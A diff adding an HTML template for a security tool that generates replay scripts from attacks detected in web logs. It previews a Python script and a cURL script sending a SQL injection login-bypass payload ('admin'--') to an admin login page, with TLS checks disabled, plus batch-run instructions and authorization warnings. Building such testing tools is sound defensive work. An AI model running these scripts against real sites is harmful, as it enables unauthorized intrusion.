@@ -1,0 +1,309 @@
+{% extends "base.html" %}
+
+{% block title %}Generate Scripts - Smart Web Attack Replay Generator{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h3 class="mb-0"><i class="fas fa-code"></i> Generate Replay Scripts</h3>
+            </div>
+            <div class="card-body">
+                {% if analysis and analysis.total_attacks > 0 %}
+                <div class="alert alert-info">
+                    <i class="fas fa-info-circle"></i> 
+                    Generate executable replay scripts for <strong>{{ analysis.total_attacks }} detected attacks</strong>.
+                    
+                    <br><br><strong>What you'll get:</strong>
+                    <ul class="mb-0 mt-2">
+                        <li><strong>Advanced Python scripts</strong> with vulnerability detection and response analysis</li>
+                        <li><strong>Batch attack script</strong> to run all attacks in sequence</li>
+                        <li><strong>Enhanced cURL commands</strong> with target URL variables</li>
+                        <li><strong>Comprehensive README</strong> with usage instructions and security guidelines</li>
+                        <li><strong>JSON summary report</strong> with attack details</li>
+                    </ul>
+                </div>
+                
+                <div class="text-center">
+                    <button id="generateBtn" class="btn btn-primary btn-lg">
+                        <i class="fas fa-rocket"></i> Generate All Replay Scripts
+                    </button>
+                </div>
+                
+                <div id="generationProgress" class="mt-4" style="display: none;">
+                    <div class="d-flex justify-content-center">
+                        <div class="spinner-border text-primary" role="status">
+                            <span class="visually-hidden">Generating...</span>
+                        </div>
+                    </div>
+                    <p class="text-center mt-2">Generating replay scripts...</p>
+                </div>
+                
+                <div id="generationResults" class="mt-4" style="display: none;">
+                    <div class="card">
+                        <div class="card-header">
+                            <h5 class="mb-0"><i class="fas fa-download"></i> Download Generated Files</h5>
+                        </div>
+                        <div class="card-body">
+                            <div class="row mb-3">
+                                <div class="col-md-3">
+                                    <div class="card stats-card">
+                                        <div class="card-body text-center">
+                                            <h3 id="pythonCount" class="text-success">0</h3>
+                                            <p class="mb-0">Python Scripts</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3">
+                                    <div class="card stats-card">
+                                        <div class="card-body text-center">
+                                            <h3 id="curlCount" class="text-info">0</h3>
+                                            <p class="mb-0">cURL Scripts</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3">
+                                    <div class="card stats-card">
+                                        <div class="card-body text-center">
+                                            <h3 id="batchCount" class="text-primary">0</h3>
+                                            <p class="mb-0">Batch Script</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-3">
+                                    <div class="card stats-card">
+                                        <div class="card-body text-center">
+                                            <h3 id="totalCount" class="text-warning">0</h3>
+                                            <p class="mb-0">Total Files</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="text-center">
+                                <a href="{{ url_for('download_scripts') }}" class="btn btn-success btn-lg">
+                                    <i class="fas fa-download"></i> Download All Scripts (ZIP)
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                {% else %}
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle"></i> 
+                    No attacks detected. Please analyze a log file with attacks first.
+                    <br><br>
+                    <a href="{{ url_for('upload_analyze') }}" class="btn btn-warning">
+                        <i class="fas fa-upload"></i> Upload & Analyze Log File
+                    </a>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</div>
+
+{% if analysis and analysis.total_attacks > 0 %}
+<div class="row mt-4">
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fab fa-python"></i> Python Script Preview</h5>
+            </div>
+            <div class="card-body">
+                <div class="code-preview">#!/usr/bin/env python3
+"""
+Advanced Attack Simulation Script
+Attack Type: SQL Injection
+Generated by AttackReplay Pro
+
+DISCLAIMER: This script is for authorized security testing only.
+Only use on systems you own or have explicit permission to test.
+"""
+
+import requests
+import time
+import random
+from datetime import datetime
+
+class AttackSimulator:
+    def __init__(self, target_url):
+        self.target_url = target_url.rstrip('/')
+        self.session = requests.Session()
+        self.attack_info = {
+            "attack_type": "SQL Injection",
+            "original_payload": "admin'--",
+            "original_ip": "192.168.1.100",
+            "timestamp": "2025-01-10 15:30:45",
+            "method": "GET"
+        }
+    
+    def simulate_attack(self):
+        """Execute the attack simulation."""
+        full_url = f"{self.target_url}/admin/login.php?username=admin&password=admin%27--"
+        
+        print(f"🚀 Launching attack against: {full_url}")
+        response = self.session.get(full_url, timeout=15, verify=False)
+        
+        # Analyze response for vulnerability indicators
+        self.analyze_response(response)
+    
+    def analyze_response(self, response):
+        """Analyze the attack response for indicators."""
+        print(f"📊 Status Code: {response.status_code}")
+        print(f"📏 Content Length: {len(response.content)} bytes")
+        
+        # Check for SQL injection indicators
+        if any(indicator in response.text.lower() for indicator in 
+               ['sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet']):
+            print("🚨 Possible SQL Injection vulnerability detected!")
+
+# Configuration - CHANGE THIS
+TARGET_URL = "http://your-target-website.com"  # ⚠️ CHANGE THIS
+
+if __name__ == "__main__":
+    simulator = AttackSimulator(TARGET_URL)
+    simulator.simulate_attack()
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-terminal"></i> cURL Command Preview</h5>
+            </div>
+            <div class="card-body">
+                <div class="code-preview">#!/bin/bash
+
+# Advanced Attack Simulation - SQL Injection
+# Generated by AttackReplay Pro
+# Original IP: 192.168.1.100
+# Timestamp: 2025-01-10 15:30:45
+
+# CHANGE TARGET_URL BEFORE RUNNING
+TARGET_URL="http://your-target-website.com"
+
+if [ "$TARGET_URL" = "http://your-target-website.com" ]; then
+    echo "❌ ERROR: Please change TARGET_URL to your actual target!"
+    exit 1
+fi
+
+echo "🎯 Executing SQL Injection attack..."
+curl -X GET \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
+  -w "\nStatus: %{http_code}\nTime: %{time_total}s\nSize: %{size_download} bytes\n" \
+  -i \
+  -k \
+  --max-time 15 \
+  "$TARGET_URL/admin/login.php?username=admin&password=admin%27--"
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="fas fa-info-circle"></i> Usage Instructions</h5>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-4">
+                        <h6><i class="fab fa-python"></i> Advanced Python Scripts</h6>
+                        <ol>
+                            <li>Extract the downloaded ZIP file</li>
+                            <li>Install requirements: <code>pip install requests</code></li>
+                            <li><strong>Edit TARGET_URL</strong> in each script to your test website</li>
+                            <li>Run individual attacks: <code>python attack_01_SQL_Injection.py</code></li>
+                            <li>Run all attacks: <code>python batch_attack_all.py</code></li>
+                        </ol>
+                    </div>
+                    <div class="col-md-4">
+                        <h6><i class="fas fa-terminal"></i> Enhanced cURL Scripts</h6>
+                        <ol>
+                            <li>Extract the downloaded ZIP file</li>
+                            <li>Make scripts executable: <code>chmod +x *.sh</code></li>
+                            <li><strong>Edit TARGET_URL</strong> variable in each script</li>
+                            <li>Run individual scripts: <code>./attack_01_SQL_Injection.sh</code></li>
+                            <li>Scripts include response analysis and timing</li>
+                        </ol>
+                    </div>
+                    <div class="col-md-4">
+                        <h6><i class="fas fa-rocket"></i> New Features</h6>
+                        <ul>
+                            <li><strong>Vulnerability Detection:</strong> Scripts analyze responses for security indicators</li>
+                            <li><strong>Batch Processing:</strong> Run all attacks in sequence with one command</li>
+                            <li><strong>Realistic Simulation:</strong> Random delays and browser-like headers</li>
+                            <li><strong>Comprehensive README:</strong> Detailed usage instructions included</li>
+                            <li><strong>Authorization Checks:</strong> Built-in safety prompts</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="alert alert-warning mt-3">
+                    <i class="fas fa-exclamation-triangle"></i> 
+                    <strong>Important:</strong> Only use these scripts against systems you own or have explicit permission to test. 
+                    Unauthorized testing is illegal and unethical.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const generateBtn = document.getElementById('generateBtn');
+    const progress = document.getElementById('generationProgress');
+    const results = document.getElementById('generationResults');
+    
+    if (generateBtn) {
+        generateBtn.addEventListener('click', function() {
+            // Show progress
+            generateBtn.style.display = 'none';
+            progress.style.display = 'block';
+            
+            // Make AJAX request to generate scripts
+            fetch('/generate_scripts', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                progress.style.display = 'none';
+                
+                if (data.success) {
+                    // Update counts
+                    document.getElementById('pythonCount').textContent = data.python_scripts;
+                    document.getElementById('curlCount').textContent = data.curl_scripts;
+                    document.getElementById('batchCount').textContent = data.batch_script ? '1' : '0';
+                    document.getElementById('totalCount').textContent = data.total_files || 0;
+                    
+                    // Show results
+                    results.style.display = 'block';
+                } else {
+                    alert('Error generating scripts: ' + data.error);
+                    generateBtn.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                progress.style.display = 'none';
+                generateBtn.style.display = 'block';
+                alert('Error generating scripts: ' + error);
+            });
+        });
+    }
+});
+</script>
+{% endblock %}
